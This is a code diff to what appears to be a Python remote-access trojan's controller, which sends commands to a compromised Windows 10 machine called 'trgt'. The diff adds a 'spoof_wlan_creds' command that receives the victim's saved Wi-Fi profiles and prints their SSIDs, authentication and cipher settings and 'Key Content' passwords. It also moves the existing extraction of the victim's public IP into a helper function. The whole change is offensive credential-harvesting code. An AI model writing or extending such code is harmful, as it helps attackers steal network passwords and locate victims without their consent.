@@ -11,6 +11,16 @@ import json                    # The process of encoding JSON is usually called 
 
 import pyfiglet                # python library to print ASCII art fonts
 
+# Getting wan/public ip:
+def getting_wanip():
+
+	print(colored("[*] Extracting wan/public ip ...", 'green'))
+
+	result1 = recv_eff()
+	result2 = trgt.recv(1024).decode('utf-8')
+
+	print(result1+result2)
+
 
 # Sending whole data all at once
 def send_eff(data):
@@ -262,13 +272,79 @@ spoof_wanip                   :    Spoofs public/wan ip of the trgt machine
 		# Spoof wan/public ip of trgt win10 machine   ✓
 		elif cmd[:11] == "spoof_wanip" and len(cmd) > 1:
 
-			print(colored("[+] Extracting wan/public ip ...", 'green'))
+			getting_wanip()
 
-			result1 = recv_eff()
-			result2 = trgt.recv(1024).decode('utf-8')
+		# spoofing wlan profile creds and wan/public ip from trgt win10 machine
+		elif cmd[:16] == "spoof_wlan_creds" and len(cmd) > 1:
 
-			print(result1+result2)
+			# Getting wan ip
+			getting_wanip()
+			print("")
 
+			# Getting wifi profile creds list from trgt
+			list_profiles = recv_eff() # it is a list which contians lists
+
+			# looping through lists
+			for creds in list_profiles:
+
+				# looping within single element (list 1, list 2 ... list n) within the list
+				for cred in creds:
+
+					# parameters for getting creds
+					auth = "Authentication"
+					mode = "Cipher"
+					key = "Security key"
+					passwd = "Key Content"
+					ssid = "SSID name"
+					name = "Name"
+
+					if name in cred:
+
+						info = cred.split(":")[1][1:-1]
+
+						print(colored("++++++++++++++++++++++++++++++++++++++",'green'))
+						print("|",name,":",info,"|")
+						print(colored("++++++++++++++++++++++++++++++++++++++",'green'))
+
+					if ssid in cred:
+
+						info = cred.split(":")[1][1:-1]
+						print(ssid,":",info)
+
+					if auth in cred:
+
+						info = cred.split(":")[1][1:-1]
+						print(auth,":", info)
+
+					if mode in cred:
+
+						info = cred.split(":")[1][1:-1]
+
+						if info != "None":
+
+							print(mode,":",info)
+
+						else:
+							print(mode,":",info)
+							print("-"*50)
+
+							continue
+
+					if key in cred:
+
+						info = cred.split(":")[1][1:-1]
+
+						if info != "Absent":
+							print(key,":",info)
+
+						else:
+							continue
+
+					if passwd in cred:
+
+						info = cred.split(":")[1][1:-1]
+						print(passwd,":",info)
+						print("-"*50)
 
 		# Screenshot    ✓
 
